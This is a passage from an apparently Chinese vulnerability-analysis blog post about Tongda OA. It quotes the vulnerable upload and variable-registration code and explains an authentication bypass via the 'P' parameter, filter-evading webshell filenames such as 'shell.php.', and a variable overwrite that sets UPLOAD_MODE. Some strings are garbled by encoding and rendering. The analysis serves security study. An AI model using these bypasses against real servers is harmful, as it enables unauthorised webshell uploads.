&#123;</span><br><span class="line">        $ATTACHMENT_NAME = td_iconv(urldecode($ATTACHMENT_NAME), <span class="string">'utf-8'</span>, MYOA_CHARSET);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    $dataBack = <span class="keyword">array</span>(<span class="string">'status'</span> =&gt; <span class="number">0</span>, <span class="string">'content'</span> =&gt; <span class="string">'-ERR '</span> . _(<span class="string">'ÎÞÎÄ¼þÉÏ´«'</span>));</span><br><span class="line">    <span class="keyword">echo</span> json_encode(data2utf8($dataBack));</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line">$FILE_SIZE = attach_size($ATTACHMENT_ID, $ATTACHMENT_NAME, $MODULE);</span><br><span class="line"><span class="keyword">if</span> (!$FILE_SIZE) &#123;</span><br><span class="line">    $dataBack = <span class="keyword">array</span>(<span class="string">'status'</span> =&gt; <span class="number">0</span>, <span class="string">'content'</span> =&gt; <span class="string">'-ERR '</span> . _(<span class="string">'ÎÄ¼þÉÏ´«Ê§°Ü'</span>));</span><br><span class="line">    <span class="keyword">echo</span> json_encode(data2utf8($dataBack));</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ($UPLOAD_MODE == <span class="string">'1'</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (is_thumbable($ATTACHMENT_NAME)) &#123;</span><br><span class="line">        $FILE_PATH = attach_real_path($ATTACHMENT_ID, $ATTACHMENT_NAME, $MODULE);</span><br><span class="line">        $THUMB_FILE_PATH = substr($FILE_PATH, <span class="number">0</span>, strlen($FILE_PATH) - strlen($ATTACHMENT_NAME)) . <span class="string">'thumb_'</span> . $ATTACHMENT_NAME;</span><br><span class="line">        CreateThumb($FILE_PATH, <span class="number">320</span>, <span class="number">240</span>, $THUMB_FILE_PATH);</span><br><span class="line">    &#125;</span><br><span class="line">    $P_VER = is_numeric($P_VER) ? intval($P_VER) : <span class="number">0</span>;</span><br><span class="line">    $MSG_CATE = $_POST[<span class="string">'MSG_CATE'</span>];</span><br><span class="line">    <span class="keyword">if</span> ($MSG_CATE == <span class="string">'file'</span>) &#123;</span><br><span class="line">        $CONTENT = <span class="string">'[fm]'</span> . $ATTACHMENT_ID . <span class="string">'|'</span> . $ATTACHMENT_NAME . <span class="string">'|'</span> . $FILE_SIZE . <span class="string">'[/fm]'</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> ($MSG_CATE == <span class="string">'image'</span>) &#123;</span><br><span class="line">            $CONTENT = <span class="string">'[im]'</span> . $ATTACHMENT_ID . <span class="string">'|'</span> . $ATTACHMENT_NAME . <span class="string">'|'</span> . $FILE_SIZE . <span class="string">'[/im]'</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $DURATION = intval($DURATION);</span><br><span class="line">            $CONTENT = <span class="string">'[vm]'</span> . $ATTACHMENT_ID . <span class="string">'|'</span> . $ATTACHMENT_NAME . <span class="string">'|'</span> . $DURATION . <span class="string">'[/vm]'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    $AID = <span class="number">0</span>;</span><br><span class="line">    $POS = strpos($ATTACHMENT_ID, <span class="string">'@'</span>);</span><br><span class="line">    <span class="keyword">if</span> ($POS !== <span class="keyword">false</span>) &#123;</span><br><span class="line">        $AID = intval(substr($ATTACHMENT_ID, <span class="number">0</span>, $POS));</span><br><span class="line">    &#125;</span><br><span class="line">    $query = <span class="string">'INSERT INTO im_offline_file (TIME,SRC_UID,DEST_UID,FILE_NAME,FILE_SIZE,FLAG,AID) values (\''</span> . date(<span class="string">'Y-m-d H:i:s'</span>) . <span class="string">'\',\''</span> . $_SESSION[<span class="string">'LOGIN_UID'</span>] . <span class="string">'\',\''</span> . $DEST_UID . <span class="string">'\',\'*'</span> . $ATTACHMENT_ID . <span class="string">'.'</span> . $ATTACHMENT_NAME . <span class="string">'\',\''</span> . $FILE_SIZE . <span class="string">'\',\'0\',\''</span> . $AID . <span class="string">'\')'</span>;</span><br><span class="line">    $cursor = exequery(TD::conn(), $query);</span><br><span class="line">    $FILE_ID = mysql_insert_id();</span><br><span class="line">    <span class="keyword">if</span> ($cursor === <span class="keyword">false</span>) &#123;</span><br><span class="line">        $dataBack = <span class="keyword">array</span>(<span class="string">'status'</span> =&gt; <span class="number">0</span>, <span class="string">'content'</span> =&gt; <span class="string">'-ERR '</span> . _(<span class="string">'Êý¾Ý¿â²Ù×÷Ê§°Ü'</span>));</span><br><span class="line">        <span class="keyword">echo</span> json_encode(data2utf8($dataBack));</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    $dataBack = <span class="keyword">array</span>(<span class="string">'status'</span> =&gt; <span class="number">1</span>, <span class="string">'content'</span> =&gt; $CONTENT, <span class="string">'file_id'</span> =&gt; $FILE_ID);</span><br><span class="line">    <span class="keyword">echo</span> json_encode(data2utf8($dataBack));</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> ($UPLOAD_MODE == <span class="string">'2'</span>) &#123;</span><br><span class="line">        $DURATION = intval($_POST[<span class="string">'DURATION'</span>]);</span><br><span class="line">        $CONTENT = <span class="string">'[vm]'</span> . $ATTACHMENT_ID . <span class="string">'|'</span> . $ATTACHMENT_NAME . <span class="string">'|'</span> . $DURATION . <span class="string">'[/vm]'</span>;</span><br><span class="line">        $query = <span class="string">'INSERT INTO WEIXUN_SHARE (UID, CONTENT, ADDTIME) VALUES (\''</span> . $_SESSION[<span class="string">'LOGIN_UID'</span>] . <span class="string">'\', \''</span> . $CONTENT . <span class="string">'\', \''</span> . time() . <span class="string">'\')'</span>;</span><br><span class="line">        $cursor = exequery(TD::conn(), $query);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'+OK '</span> . $CONTENT;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> ($UPLOAD_MODE == <span class="string">'3'</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (is_thumbable($ATTACHMENT_NAME)) &#123;</span><br><span class="line">                $FILE_PATH = attach_real_path($ATTACHMENT_ID, $ATTACHMENT_NAME, $MODULE);</span><br><span class="line">                $THUMB_FILE_PATH = substr($FILE_PATH, <span class="number">0</span>, strlen($FILE_PATH) - strlen($ATTACHMENT_NAME)) . <span class="string">'thumb_'</span> . $ATTACHMENT_NAME;</span><br><span class="line">                CreateThumb($FILE_PATH, <span class="number">320</span>, <span class="number">240</span>, $THUMB_FILE_PATH);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'+OK '</span> . $ATTACHMENT_ID;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $CONTENT = <span class="string">'[fm]'</span> . $ATTACHMENT_ID . <span class="string">'|'</span> . $ATTACHMENT_NAME . <span class="string">'|'</span> . $FILE_SIZE . <span class="string">'[/fm]'</span>;</span><br><span class="line">            $msg_id = send_msg($_SESSION[<span class="string">'LOGIN_UID'</span>], $DEST_UID, <span class="number">1</span>, $CONTENT, <span class="string">''</span>, <span class="number">2</span>);</span><br><span class="line">            $query = <span class="string">'insert into IM_OFFLINE_FILE (TIME,SRC_UID,DEST_UID,FILE_NAME,FILE_SIZE,FLAG) values (\''</span> . date(<span class="string">'Y-m-d H:i:s'</span>) . <span class="string">'\',\''</span> . $_SESSION[<span class="string">'LOGIN_UID'</span>] . <span class="string">'\',\''</span> . $DEST_UID . <span class="string">'\',\'*'</span> . $ATTACHMENT_ID . <span class="string">'.'</span> . $ATTACHMENT_NAME . <span class="string">'\',\''</span> . $FILE_SIZE . <span class="string">'\',\'0\')'</span>;</span><br><span class="line">            $cursor = exequery(TD::conn(), $query);</span><br><span class="line">            $FILE_ID = mysql_insert_id();</span><br><span class="line">            <span class="keyword">if</span> ($cursor === <span class="keyword">false</span>) &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">'-ERR '</span> . _(<span class="string">'Êý¾Ý¿â²Ù×÷Ê§°Ü'</span>);</span><br><span class="line">                <span class="keyword">exit</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> ($FILE_ID == <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">'-ERR '</span> . _(<span class="string">'Êý¾Ý¿â²Ù×÷Ê§°Ü2'</span>);</span><br><span class="line">                <span class="keyword">exit</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'+OK ,'</span> . $FILE_ID . <span class="string">','</span> . $msg_id;</span><br><span class="line">            <span class="keyword">exit</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>看下开头这一块，就是绕过的核心部分</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">set_time_limit(0);</span><br><span class="line">$P &#x3D; $_POST[&#39;P&#39;];</span><br><span class="line">if (isset($P) || $P !&#x3D; &#39;&#39;) &#123;</span><br><span class="line">    ob_start();</span><br><span class="line">    include_once &#39;inc&#x2F;session.php&#39;;</span><br><span class="line">    session_id($P);</span><br><span class="line">    session_start();</span><br><span class="line">    session_write_close();</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    include_once &#39;.&#x2F;auth.php&#39;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>这里获取了一个P，如果P存在或者不为空，就要包含上面的auth.php，看名字就知道是一个主要实现身份认证功能，所以通过这里的参数”P”绕过登录认证，就可以去下面的上传了</li><li>在往后就是两个IF条件句，只要进去了都要exit退出，所以要绕过才能进入上传的逻辑里面</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$DEST_UID &#x3D; $_POST[&#39;DEST_UID&#39;];</span><br><span class="line">还好这个参数可控，要求不能为 0 也不能为空就可以了</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200403094623450.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><ul><li>进入循环后使用PHP的 $_FILES 函数来获取我们上传的文件信息</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$_FILES[&#39;ATTACHMENT&#39;][&#39;name&#39;]</span><br></pre></td></tr></table></figure><ul><li>第一个下标必须是我们的input name值，因此我们的POST包的Content-Disposition: form-data; name=“ATTACHMENT”; filename=”xxx.php.png”中的name必须是’ATTACHMENT’。</li><li>也就是有文件上传就会调用upload函数</li><li>后续对获取的文件名处理了一下，对获取的文件名行一次url解码，对比文件名长度是否有变化，如果有变化，则将url解码后的文件名作为最后的文件名</li><li>在45行有upload函数，要跟进看一下干了什么，inc/utility_file.php的1321行</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ATTACHMENTS &#x3D; upload(&#39;ATTACHMENT&#39;, $MODULE, false);</span><br></pre></td></tr></table></figure><p>函数具体代码如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">upload</span><span class="params">($PREFIX = <span class="string">'ATTACHMENT'</span>, $MODULE = <span class="string">''</span>, $OUTPUT = true)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (strstr($MODULE, <span class="string">'/'</span>) || strstr($MODULE, <span class="string">'\\'</span>)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!$OUTPUT) &#123;</span><br><span class="line">            <span class="keyword">return</span> _(<span class="string">'参数含有非法字符。'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        Message(_(<span class="string">'错误'</span>), _(<span class="string">'参数含有非法字符。'</span>));</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    $ATTACHMENTS = <span class="keyword">array</span>(<span class="string">'ID'</span> =&gt; <span class="string">''</span>, <span class="string">'NAME'</span> =&gt; <span class="string">''</span>);</span><br><span class="line">    reset($_FILES);</span><br><span class="line">    <span class="keyword">foreach</span> ($_FILES <span class="keyword">as</span> $KEY =&gt; $ATTACHMENT) &#123;</span><br><span class="line">        <span class="keyword">if</span> ($ATTACHMENT[<span class="string">'error'</span>] == <span class="number">4</span> || $KEY != $PREFIX &amp;&amp; substr($KEY, <span class="number">0</span>, strlen($PREFIX) + <span class="number">1</span>) != $PREFIX . <span class="string">'_'</span>) &#123;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        $data_charset = <span class="keyword">isset</span>($_GET[<span class="string">'data_charset'</span>]) ? $_GET[<span class="string">'data_charset'</span>] : (<span class="keyword">isset</span>($_POST[<span class="string">'data_charset'</span>]) ? $_POST[<span class="string">'data_charset'</span>] : <span class="string">''</span>);</span><br><span class="line">        $ATTACH_NAME = $data_charset != <span class="string">''</span> ? td_iconv($ATTACHMENT[<span class="string">'name'</span>], $data_charset, MYOA_CHARSET) : $ATTACHMENT[<span class="string">'name'</span>];</span><br><span class="line">        $ATTACH_SIZE = $ATTACHMENT[<span class="string">'size'</span>];</span><br><span class="line">        $ATTACH_ERROR = $ATTACHMENT[<span class="string">'error'</span>];</span><br><span class="line">        $ATTACH_FILE = $ATTACHMENT[<span class="string">'tmp_name'</span>];</span><br><span class="line">        $ERROR_DESC = <span class="string">''</span>;</span><br><span class="line">        <span class="keyword">if</span> ($ATTACH_ERROR == UPLOAD_ERR_OK) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!is_uploadable($ATTACH_NAME)) &#123;</span><br><span class="line">                $ERROR_DESC = sprintf(_(<span class="string">'禁止上传后缀名为[%s]的文件'</span>), substr($ATTACH_NAME, strrpos($ATTACH_NAME, <span class="string">'.'</span>) + <span class="number">1</span>));</span><br><span class="line">            &#125;</span><br><span class="line">            $encode = mb_detect_encoding($ATTACH_NAME, <span class="keyword">array</span>(<span class="string">'ASCII'</span>, <span class="string">'UTF-8'</span>, <span class="string">'GB2312'</span>, <span class="string">'GBK'</span>, <span class="string">'BIG5'</span>));</span><br><span class="line">            <span class="keyword">if</span> ($encode != <span class="string">'UTF-8'</span>) &#123;</span><br><span class="line">                $ATTACH_NAME_UTF8 = mb_convert_encoding($ATTACH_NAME, <span class="string">'utf-8'</span>, MYOA_CHARSET);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $ATTACH_NAME_UTF8 = $ATTACH_NAME;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (preg_match(<span class="string">'/[\\\':&lt;&gt;?]|\\/|\\\\|"|\\|/u'</span>, $ATTACH_NAME_UTF8)) &#123;</span><br><span class="line">                $ERROR_DESC = sprintf(_(<span class="string">'文件名[%s]包含[/\\\'":*?&lt;&gt;|]等非法字符'</span>), $ATTACH_NAME);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> ($ATTACH_SIZE == <span class="number">0</span>) &#123;</span><br><span class="line">                $ERROR_DESC = sprintf(_(<span class="string">'文件[%s]大小为0字节'</span>), $ATTACH_NAME);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> ($ERROR_DESC == <span class="string">''</span>) &#123;</span><br><span class="line">                $ATTACH_NAME = str_replace(<span class="string">'\''</span>, <span class="string">''</span>, $ATTACH_NAME);</span><br><span class="line">                $ATTACH_ID = add_attach($ATTACH_FILE, $ATTACH_NAME, $MODULE);</span><br><span class="line">                <span class="keyword">if</span> ($ATTACH_ID === <span class="keyword">false</span>) &#123;</span><br><span class="line">                    $ERROR_DESC = sprintf(_(<span class="string">'文件[%s]上传失败'</span>), $ATTACH_NAME);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    $ATTACHMENTS[<span class="string">'ID'</span>] .= $ATTACH_ID . <span class="string">','</span>;</span><br><span class="line">                    $ATTACHMENTS[<span class="string">'NAME'</span>] .= $ATTACH_NAME . <span class="string">'*'</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            @unlink($ATTACH_FILE);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> ($ATTACH_ERROR == UPLOAD_ERR_INI_SIZE) &#123;</span><br><span class="line">                $ERROR_DESC = sprintf(_(<span class="string">'文件[%s]的大小超过了系统限制（%s）'</span>), $ATTACH_NAME, ini_get(<span class="string">'upload_max_filesize'</span>));</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> ($ATTACH_ERROR == UPLOAD_ERR_FORM_SIZE) &#123;</span><br><span class="line">                    $ERROR_DESC = sprintf(_(<span class="string">'文件[%s]的大小超过了表单限制'</span>), $ATTACH_NAME);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">if</span> ($ATTACH_ERROR == UPLOAD_ERR_PARTIAL) &#123;</span><br><span class="line">                        $ERROR_DESC = sprintf(_(<span class="string">'文件[%s]上传不完整'</span>), $ATTACH_NAME);</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        <span class="keyword">if</span> ($ATTACH_ERROR == UPLOAD_ERR_NO_TMP_DIR) &#123;</span><br><span class="line">                            $ERROR_DESC = sprintf(_(<span class="string">'文件[%s]上传失败：找不到临时文件夹'</span>), $ATTACH_NAME);</span><br><span class="line">                        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                            <span class="keyword">if</span> ($ATTACH_ERROR == UPLOAD_ERR_CANT_WRITE) &#123;</span><br><span class="line">                                $ERROR_DESC = sprintf(_(<span class="string">'文件[%s]写入失败'</span>), $ATTACH_NAME);</span><br><span class="line">                            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                                $ERROR_DESC = sprintf(_(<span class="string">'未知错误[代码：%s]'</span>), $ATTACH_ERROR);</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ($ERROR_DESC != <span class="string">''</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!$OUTPUT) &#123;</span><br><span class="line">                delete_attach($ATTACHMENTS[<span class="string">'ID'</span>], $ATTACHMENTS[<span class="string">'NAME'</span>], $MODULE);</span><br><span class="line">                <span class="keyword">return</span> $ERROR_DESC;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                Message(_(<span class="string">'错误'</span>), $ERROR_DESC);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $ATTACHMENTS;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>看下is_uploadable()函数对文件名进行检查，跟进到该函数，同样位于inc/utility_file.php</li></ul><p><img src="https://img-blog.csdnimg.cn/20200330095139194.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><ul><li>这个仔细看一下，代码意思是查找 “.” 在文件名中最后一次出现的位置然后</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strtolower(substr($FILE_NAME, $POS + 1, 3)) &#x3D;&#x3D; &#39;php&#39;</span><br></pre></td></tr></table></figure><ul><li>这是 substr( 文件名,最后一次点的位置+1,3个位置)</li><li>从存在 ”.“ 开始匹配3位，判断后缀是否为php，,如果为php则返回false,否则将”.”之前的作为EXT_NAME。</li></ul><p><img src="https://img-blog.csdnimg.cn/20200330095216717.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><ul><li>这么判断 .php肯定是不行了，只能是 shell.php. 或者 shell.php.png</li><li>那么只能是配合文件包含漏洞了</li></ul><h2 id="变量传递问题"><a href="#变量传递问题" class="headerlink" title="变量传递问题"></a>变量传递问题</h2><ul><li><p>由于在upload.php中UPLOAD_MODE值的是一个重要的流程走向的判断</p></li><li><p>但是并没有发现是从哪来的，所以一直很疑惑，</p></li><li><p>但根据payload中POST的UPLOAD_MODE值可以被正常带入且影响文件上传走向</p></li><li><p>预测 UPLOAD_MODE值的方法存在于被包含的文件中,</p></li><li><p>但是UPLOAD_MODE这个参数名仅存在于upload.php中</p></li><li><p>开始追溯，发现下面的路径</p></li><li><p>具体调用为upload.php -&gt; session.php -&gt; coon.php -&gt; td_config.php -&gt; common.inc.php</p></li></ul><p>关键部分</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">if (0 &lt; count($_POST)) &#123;</span><br><span class="line">    $arr_html_fields &#x3D; array();</span><br><span class="line">    foreach ($_POST as $s_key &#x3D;&gt; $s_value) &#123;</span><br><span class="line">        if (substr($s_key, 0, 7) &#x3D;&#x3D; &#39;_SERVER&#39;) &#123;</span><br><span class="line">            continue;</span><br><span class="line">        &#125;</span><br><span class="line">        if (substr($s_key, 0, 15) !&#x3D; &#39;TD_HTML_EDITOR_&#39;) &#123;</span><br><span class="line">            if (!is_array($s_value)) &#123;</span><br><span class="line">                $_POST[$s_key] &#x3D; addslashes(strip_tags($s_value));</span><br><span class="line">            &#125;</span><br><span class="line">            $&#123;$s_key&#125; &#x3D; $_POST[$s_key];</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            if ($s_key &#x3D;&#x3D; &#39;TD_HTML_EDITOR_FORM_HTML_DATA&#39; || $s_key &#x3D;&#x3D; &#39;TD_HTML_EDITOR_PRCS_IN&#39; || $s_key &#x3D;&#x3D; &#39;TD_HTML_EDITOR_PRCS_OUT&#39; || $s_key &#x3D;&#x3D; &#39;TD_HTML_EDITOR_QTPL_PRCS_SET&#39; || isset($_POST[&#39;ACTION_TYPE&#39;]) &amp;&amp; ($_POST[&#39;ACTION_TYPE&#39;] &#x3D;&#x3D; &#39;approve_center&#39; || $_POST[&#39;ACTION_TYPE&#39;] &#x3D;&#x3D; &#39;workflow&#39; || $_POST[&#39;ACTION_TYPE&#39;] &#x3D;&#x3D; &#39;sms&#39; || $_POST[&#39;ACTION_TYPE&#39;] &#x3D;&#x3D; &#39;wiki&#39;) &amp;&amp; ($s_key &#x3D;&#x3D; &#39;CONTENT&#39; || $s_key &#x3D;&#x3D; &#39;TD_HTML_EDITOR_CONTENT&#39; || $s_key &#x3D;&#x3D; &#39;TD_HTML_EDITOR_TPT_CONTENT&#39;)) &#123;</span><br><span class="line">                unset($_POST[$s_key]);</span><br><span class="line">                $s_key &#x3D; $s_key &#x3D;&#x3D; &#39;CONTENT&#39; ? $s_key : substr($s_key, 15);</span><br><span class="line">                $&#123;$s_key&#125; &#x3D; addslashes($s_value);</span><br><span class="line">                $arr_html_fields[$s_key] &#x3D; $&#123;$s_key&#125;;</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                $encoding &#x3D; mb_detect_encoding($s_value, &#39;GBK,UTF-8&#39;);</span><br><span class="line">                unset($_POST[$s_key]);</span><br><span class="line">                $s_key &#x3D; substr($s_key, 15);</span><br><span class="line">                $&#123;$s_key&#125; &#x3D; addslashes(rich_text_clean($s_value, $encoding));</span><br><span class="line">                $arr_html_fields[$s_key] &#x3D; $&#123;$s_key&#125;;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    reset($_POST);</span><br><span class="line">    $_POST &#x3D; array_merge($_POST, $arr_html_fields);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>首先一开始对 P O S T 长 度 进 行 了 判 断 , 这 里 _POST长度进行了判断,这里 P​OST长度进行了判断,这里_POST实际是一个数组,接着使用foreach函数对数组进行遍历,</li><li>在这里$_POST数组中key为”UPLOAD_MODE”,value为”2”,那么根据配会到</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">if (substr($s_key, 0, 15) !&#x3D; &#39;TD_HTML_EDITOR_&#39;) &#123;</span><br><span class="line">            if (!is_array($s_value)) &#123;</span><br><span class="line">                $_POST[$s_key] &#x3D; addslashes(strip_tags($s_value));</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">            &#x2F;&#x2F;直接来这</span><br><span class="line">            $&#123;$s_key&#125; &#x3D; $_POST[$s_key];</span><br></pre></td></tr></table></figure><ul><li><p>最终数组键名UPLOAD_MODE成了了变量名,而他的对应键值成为了变量值</p></li><li><p>所以 upload.php 未直接接收UPLOAD_MODE值,而我们仍可以传递到这里</p></li><li><p>upload函数的中 调用 add_attach函数，设置$ATTACHMENTS[‘ID’]</p></li></ul><p><img src="https://img-blog.csdnimg.cn/20200330095243732.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt=""></p><ul><li>再往后 继续跟进函数add_attach，函数同样位于inc/utility_file.php文件下</li><li>找到了保存路径的方式</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span 